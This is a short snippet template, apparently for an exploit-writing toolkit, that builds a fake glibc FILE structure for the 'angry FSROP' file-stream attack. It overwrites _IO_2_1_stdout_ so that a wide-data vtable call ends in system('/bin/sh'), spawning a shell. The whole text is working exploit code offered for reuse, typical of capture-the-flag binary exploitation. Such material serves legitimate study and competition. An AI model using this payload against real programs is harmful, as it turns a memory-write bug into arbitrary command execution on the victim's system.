# HEADER
# name: angry-fsrop
# prefix: angry-fsrop
# description: 
# author: keymoon

# VARIABLES
# _libc: libc
# _write_addr: libc.symbol("_IO_2_1_stdout_", True)

write_addr = _write_addr
fake_file = b''
fake_file += p64(0x3b01010101010101) # flags
fake_file += b"/bin/sh\0" # read_ptr
fake_file = fake_file.ljust(0x28, b'\x00')
fake_file += p64(1)
fake_file = fake_file.ljust(0x68, b'\x00')
fake_file += p64(_libc.symbol("system", True))             # _IO_jump_t.__doallocate
fake_file = fake_file.ljust(0x88, b'\x00')
fake_file += p64(_libc.symbol("_IO_stdfile_1_lock", True)) # _IO_file.lock
fake_file = fake_file.ljust(0xa0, b'\x00')
fake_file += p64(write_addr)                          # _IO_file.wide_data
fake_file = fake_file.ljust(0xc0, b'\x00')
fake_file += p64(0)                                       # _IO_file._mode
fake_file = fake_file.ljust(0xd8, b'\x00')
fake_file += p64(_libc.symbol("_IO_wfile_jumps", True))    # _IO_file.vtable
fake_file = fake_file.ljust(0xe0, b'\x00')
fake_file += p64(write_addr)                   # _IO_wide_data.vtable
